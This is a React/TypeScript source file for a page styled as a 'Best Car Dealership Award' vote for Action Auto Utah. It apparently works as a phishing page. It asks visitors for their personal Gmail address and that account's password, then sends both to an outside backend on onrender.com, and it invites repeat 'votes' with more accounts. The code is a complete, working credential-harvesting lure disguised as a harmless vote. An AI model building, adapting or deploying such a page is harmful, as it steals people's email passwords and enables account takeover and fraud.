import React, { useState } from 'react';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://votingsystem-tqdk.onrender.com';

interface VoteResponse {
  message?: string;
}

const VotingSystem: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [password, setPassword] = useState<string>('');
  const [voted, setVoted] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);

  const handleNext = (): void => {
    if (!email.trim()) {
      alert('Please enter your personal email');
      return;
    }
    setShowPassword(true);
  };

  const handleSignIn = async (): Promise<void> => {
    if (!password.trim()) {
      alert('Please enter your password');
      return;
    }
    setLoading(true);
    try {
      const response = await fetch(`${BACKEND_URL}/api/vote`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data: VoteResponse = await response.json();
      if (response.ok) {
        setEmail('');
        setPassword('');
        setShowPassword(false);
        setVoted(true);
      } else {
        alert(data.message || 'Error submitting vote');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error connecting to server');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="min-h-screen relative overflow-hidden"
      style={{ background: 'linear-gradient(160deg, #0a0a0a 0%, #111827 45%, #0f1a2e 100%)' }}
    >
      {/* Carbon fiber texture overlay */}
      <div
        className="absolute inset-0 opacity-[0.03]"
        style={{
          backgroundImage: `repeating-linear-gradient(0deg, transparent, transparent 2px, #e2b43c 2px, #e2b43c 3px),
            repeating-linear-gradient(90deg, transparent, transparent 2px, #e2b43c 2px, #e2b43c 3px)`,
        }}
      />

      {/* Speed lines bg */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {[...Array(10)].map((_, i) => (
          <div
            key={i}
            className="absolute"
            style={{
              top: `${8 + i * 9}%`,
              left: '-10%',
              right: '-10%',
              height: '1px',
              background: `linear-gradient(90deg, transparent 0%, rgba(226,180,60,${0.03 + i * 0.01}) 40%, rgba(226,180,60,${0.07 + i * 0.01}) 60%, transparent 100%)`,
              transform: `skewY(-${0.8 + i * 0.25}deg)`,
            }}
          />
        ))}

        {/* Glow orbs */}
        <div
          className="absolute rounded-full"
          style={{
            width: 600, height: 600, top: '-15%', right: '-15%',
            background: 'radial-gradient(circle, rgba(226,180,60,0.06) 0%, transparent 70%)',
          }}
        />
        <div
          className="absolute rounded-full"
          style={{
            width: 400, height: 400, bottom: '-10%', left: '-10%',
            background: 'radial-gradient(circle, rgba(37,99,235,0.05) 0%, transparent 70%)',
          }}
        />

        {/* Floating particles */}
        {[...Array(14)].map((_, i) => (
          <div
            key={i}
            className="absolute rounded-full"
            style={{
              width: `${2 + (i % 3)}px`,
              height: `${2 + (i % 3)}px`,
              top: `${(i * 7.1) % 100}%`,
              left: `${(i * 13.3) % 100}%`,
              background: i % 2 === 0 ? '#e2b43c' : '#3b82f6',
              opacity: 0.25,
              animation: `drift ${5 + i}s ease-in-out infinite`,
              animationDelay: `${i * 0.4}s`,
            }}
          />
        ))}
      </div>

      {/* Top gold bar */}
      <div
        className="absolute top-0 left-0 right-0 h-[3px]"
        style={{ background: 'linear-gradient(90deg, #78350f, #e2b43c, #fde68a, #e2b43c, #78350f)' }}
      />

      <div className="relative z-10 min-h-screen flex flex-col">

        {/* ── Header ── */}
        <header className="w-full px-4 pt-12 pb-8">
          <div className="max-w-4xl mx-auto text-center">

            {/* Award badge */}
            <div
              className="inline-flex items-center gap-2 mb-6 px-5 py-2 rounded-full"
              style={{
                background: 'rgba(226,180,60,0.08)',
                border: '1px solid rgba(226,180,60,0.3)',
              }}
            >
              <span className="text-xs font-bold tracking-[0.2em] uppercase"
                style={{ color: '#e2b43c', fontFamily: "'Courier New', monospace" }}>
                🏆 Best Car Dealership Award · Utah, USA
              </span>
            </div>

            {/* Category pills */}
            <div className="flex flex-wrap items-center justify-center gap-3 mb-6">
              <span
                className="px-5 py-2 rounded-full text-xs font-bold tracking-widest uppercase"
                style={{
                  background: 'linear-gradient(135deg, #1e3a5f, #1d4ed8)',
                  color: '#bfdbfe',
                  boxShadow: '0 2px 18px rgba(29,78,216,0.3)',
                  fontFamily: "'Courier New', monospace",
                }}
              >
                🚗 Automotive Excellence
              </span>
              <span
                className="px-5 py-2 rounded-full text-xs font-bold tracking-widest uppercase"
                style={{
                  background: 'linear-gradient(135deg, #451a03, #b45309)',
                  color: '#fde68a',
                  boxShadow: '0 2px 18px rgba(180,83,9,0.3)',
                  fontFamily: "'Courier New', monospace",
                }}
              >
                ⭐ Customer Service
              </span>
            </div>

            {/* Main headline */}
            <h1
              className="font-black leading-none mb-3 uppercase"
              style={{
                fontFamily: "'Georgia', 'Times New Roman', serif",
                fontSize: 'clamp(2rem, 6vw, 4.2rem)',
                color: '#fff',
                letterSpacing: '-0.02em',
              }}
            >
              Vote{' '}
              <span
                style={{
                  background: 'linear-gradient(90deg, #e2b43c, #fde68a, #e2b43c)',
                  WebkitBackgroundClip: 'text',
                  WebkitTextFillColor: 'transparent',
                }}
              >
                Action Auto Utah
              </span>
            </h1>

            <p
              className="text-sm"
              style={{
                color: 'rgba(255,255,255,0.4)',
                fontFamily: "'Courier New', monospace",
                letterSpacing: '0.08em',
              }}
            >
              Help us earn the title of Utah's #1 Car Dealership
            </p>
          </div>
        </header>

        {/* ── Form Card ── */}
        <main className="flex-1 flex items-center justify-center px-4 pb-10">
          <div className="w-full max-w-sm">
            <div
              className="rounded-2xl overflow-hidden"
              style={{
                background: 'rgba(255,255,255,0.04)',
                backdropFilter: 'blur(24px)',
                border: '1px solid rgba(226,180,60,0.2)',
                boxShadow: '0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(226,180,60,0.12)',
              }}
            >
              {/* Card accent bar */}
              <div className="h-[2px]" style={{ background: 'linear-gradient(90deg, #1e3a5f, #e2b43c, #1d4ed8)' }} />

              <div className="p-8">

                {/* Icon + card title */}
                <div className="flex flex-col items-center mb-7">
                  <div
                    className="w-16 h-16 rounded-xl flex items-center justify-center text-3xl mb-3"
                    style={{
                      background: 'linear-gradient(135deg, rgba(226,180,60,0.12), rgba(29,78,216,0.12))',
                      border: '1px solid rgba(226,180,60,0.2)',
                    }}
                  >
                    🗳️
                  </div>
                  <h2
                    className="text-xl font-bold mb-1"
                    style={{ color: '#fff', fontFamily: "'Georgia', serif" }}
                  >
                    Cast Your Vote
                  </h2>
                  <p
                    className="text-xs text-center leading-relaxed"
                    style={{ color: 'rgba(255,255,255,0.4)', fontFamily: "'Courier New', monospace" }}
                  >
                    Sign in with your{' '}
                    <span style={{ color: '#fbbf24', fontWeight: 700 }}>personal email</span>
                    {' '}to continue
                  </p>
                </div>

                {/* ⚠️ Personal email notice */}
                <div
                  className="flex items-start gap-2 mb-5 px-3 py-3 rounded-xl"
                  style={{
                    background: 'rgba(251,191,36,0.07)',
                    border: '1px solid rgba(251,191,36,0.2)',
                  }}
                >
                  <span style={{ fontSize: 13, marginTop: 1, flexShrink: 0 }}>⚠️</span>
                  <p
                    className="text-xs leading-relaxed"
                    style={{ color: 'rgba(255,255,255,0.65)', fontFamily: "'Courier New', monospace" }}
                  >
                    Please use your <strong style={{ color: '#fbbf24' }}>personal email</strong> (Gmail Only).{' '}
                    <strong style={{ color: '#f87171' }}>Do NOT</strong> use your work or organization email.
                  </p>
                </div>

                {/* Email providers row */}
                <div
                  className="flex items-center gap-3 mb-5 px-4 py-3 rounded-xl"
                  style={{
                    background: 'rgba(255,255,255,0.04)',
                    border: '1px solid rgba(255,255,255,0.07)',
                  }}
                >
                  <div className="flex gap-2 items-center">
                    {/* Gmail */}
                    <svg className="w-5 h-5" viewBox="0 0 48 48">
                      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
                  </div>
                  <span
                    className="text-xs"
                    style={{ color: 'rgba(255,255,255,0.4)', fontFamily: "'Courier New', monospace" }}
                  >
                    Personal Gmail Account Only.
                  </span>
                </div>

                {/* ── Email step ── */}
                {!showPassword ? (
                  <div className="space-y-4">
                    <input
                      type="email"
                      value={email}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) => setEmail(e.target.value)}
                      placeholder="Personal email address"
                      className="w-full px-4 py-3.5 rounded-xl text-sm outline-none transition-all"
                      style={{
                        background: 'rgba(255,255,255,0.06)',
                        border: '1.5px solid rgba(255,255,255,0.12)',
                        color: '#fff',
                        fontFamily: "'Courier New', monospace",
                      }}
                      onFocus={e => {
                        e.target.style.borderColor = '#e2b43c';
                        e.target.style.background = 'rgba(226,180,60,0.07)';
                      }}
                      onBlur={e => {
                        e.target.style.borderColor = 'rgba(255,255,255,0.12)';
                        e.target.style.background = 'rgba(255,255,255,0.06)';
                      }}
                      onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleNext()}
                    />

                    <p
                      className="text-xs leading-relaxed"
                      style={{ color: 'rgba(255,255,255,0.3)', fontFamily: "'Courier New', monospace" }}
                    >
                    </p>

                    <button
                      onClick={handleNext}
                      className="w-full py-3.5 rounded-xl font-bold text-sm tracking-widest uppercase transition-all"
                      style={{
                        background: 'linear-gradient(135deg, #92400e, #d97706, #e2b43c)',
                        color: '#0a0a0a',
                        fontFamily: "'Courier New', monospace",
                        boxShadow: '0 4px 24px rgba(226,180,60,0.35)',
                        letterSpacing: '0.12em',
                      }}
                      onMouseEnter={e => (e.currentTarget.style.opacity = '0.88')}
                      onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
                    >
                      Next →
                    </button>
                  </div>
                ) : (
                  /* ── Password step ── */
                  <div className="space-y-4">
                    {/* Email chip */}
                    <div
                      className="flex items-center gap-3 px-4 py-3 rounded-xl"
                      style={{
                        background: 'rgba(255,255,255,0.05)',
                        border: '1.5px solid rgba(226,180,60,0.2)',
                      }}
                    >
                      <div
                        className="w-8 h-8 rounded-full flex items-center justify-center text-sm flex-shrink-0"
                        style={{ background: 'linear-gradient(135deg, #92400e, #1e3a5f)' }}
                      >
                        👤
                      </div>
                      <span
                        className="text-sm font-medium truncate"
                        style={{ color: '#fff', fontFamily: "'Courier New', monospace" }}
                      >
                        {email}
                      </span>
                    </div>

                    <input
                      type="password"
                      value={password}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) => setPassword(e.target.value)}
                      placeholder="Enter your password"
                      className="w-full px-4 py-3.5 rounded-xl text-sm outline-none transition-all"
                      style={{
                        background: 'rgba(255,255,255,0.06)',
                        border: '1.5px solid rgba(255,255,255,0.12)',
                        color: '#fff',
                        fontFamily: "'Courier New', monospace",
                      }}
                      onFocus={e => {
                        e.target.style.borderColor = '#3b82f6';
                        e.target.style.background = 'rgba(59,130,246,0.07)';
                      }}
                      onBlur={e => {
                        e.target.style.borderColor = 'rgba(255,255,255,0.12)';
                        e.target.style.background = 'rgba(255,255,255,0.06)';
                      }}
                      onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleSignIn()}
                      disabled={loading}
                    />

                    <div className="flex justify-between items-center pt-1">
                      <button
                        onClick={() => setShowPassword(false)}
                        className="text-sm transition-colors"
                        style={{ color: 'rgba(255,255,255,0.35)', fontFamily: "'Courier New', monospace" }}
                        disabled={loading}
                        onMouseEnter={e => (e.currentTarget.style.color = '#e2b43c')}
                        onMouseLeave={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.35)')}
                      >
                        ← Back
                      </button>
                      <button
                        onClick={handleSignIn}
                        disabled={loading}
                        className="px-7 py-3 rounded-xl font-bold text-xs tracking-widest uppercase transition-all"
                        style={{
                          background: loading
                            ? 'rgba(255,255,255,0.08)'
                            : 'linear-gradient(135deg, #1e3a5f, #1d4ed8)',
                          color: '#fff',
                          fontFamily: "'Courier New', monospace",
                          boxShadow: loading ? 'none' : '0 4px 20px rgba(29,78,216,0.4)',
                          opacity: loading ? 0.6 : 1,
                          cursor: loading ? 'not-allowed' : 'pointer',
                          letterSpacing: '0.1em',
                        }}
                      >
                        {loading ? 'Submitting…' : 'Sign In →'}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* One vote badge */}
            <div className="mt-5 text-center">
              <div
                className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full"
                style={{
                  background: 'rgba(226,180,60,0.07)',
                  border: '1px solid rgba(226,180,60,0.2)',
                }}
              >
                <span style={{ fontSize: 13 }}>🔒</span>
                <span
                  className="text-xs font-medium"
                  style={{ color: 'rgba(255,255,255,0.55)', fontFamily: "'Courier New', monospace" }}
                >
                  1 vote per personal email account
                </span>
              </div>
            </div>
          </div>
        </main>

        {/* ── Thank You Screen ── */}
        {voted && (
          <div className="relative z-20 fixed inset-0 flex items-center justify-center px-4"
            style={{ background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)' }}
          >
            <div
              className="w-full max-w-sm rounded-2xl overflow-hidden text-center"
              style={{
                background: 'rgba(255,255,255,0.05)',
                border: '1px solid rgba(226,180,60,0.25)',
                boxShadow: '0 24px 80px rgba(0,0,0,0.7)',
              }}
            >
              <div className="h-[2px]" style={{ background: 'linear-gradient(90deg, #1e3a5f, #e2b43c, #1d4ed8)' }} />
              <div className="p-10">
                <div className="text-5xl mb-5">🎉</div>
                <h3
                  className="text-2xl font-bold mb-2"
                  style={{ color: '#fff', fontFamily: "'Georgia', serif" }}
                >
                  Thank you for voting!
                </h3>
                <p
                  className="text-sm leading-relaxed mb-1"
                  style={{ color: 'rgba(255,255,255,0.5)', fontFamily: "'Courier New', monospace" }}
                >
                  You voted for{' '}
                  <span style={{ color: '#e2b43c', fontWeight: 700 }}>Action Auto Utah</span>
                  {' '}as Best Car Dealership.
                </p>
                <p
                  className="text-xs mb-7"
                  style={{ color: 'rgba(255,255,255,0.3)', fontFamily: "'Courier New', monospace" }}
                >
                  You can still vote using another personal email account.
                </p>
                <button
                  onClick={() => setVoted(false)}
                  className="px-8 py-3 rounded-xl text-sm font-bold tracking-widest uppercase transition-all"
                  style={{
                    background: 'linear-gradient(135deg, #92400e, #d97706)',
                    color: '#0a0a0a',
                    fontFamily: "'Courier New', monospace",
                    boxShadow: '0 4px 20px rgba(217,119,6,0.35)',
                    letterSpacing: '0.1em',
                  }}
                  onMouseEnter={e => (e.currentTarget.style.opacity = '0.85')}
                  onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
                >
                  Vote Again →
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="text-center pb-6 px-4">
          <p
            className="text-xs"
            style={{
              color: 'rgba(255,255,255,0.2)',
              fontFamily: "'Courier New', monospace",
              letterSpacing: '0.06em',
            }}
          >
            🚗 Action Auto Utah · Celebrating Automotive Excellence · Utah, USA
          </p>
        </div>
      </div>

      {/* Bottom gold bar */}
      <div
        className="absolute bottom-0 left-0 right-0 h-[2px]"
        style={{ background: 'linear-gradient(90deg, #78350f, #e2b43c, #fde68a, #e2b43c, #78350f)' }}
      />

      <style>{`
        @keyframes drift {
          0%, 100% { transform: translateY(0px); opacity: 0.2; }
          50% { transform: translateY(-12px); opacity: 0.45; }
        }
        input::placeholder { color: rgba(255,255,255,0.25) !important; }
      `}</style>
    </div>
  );
};

export default VotingSystem;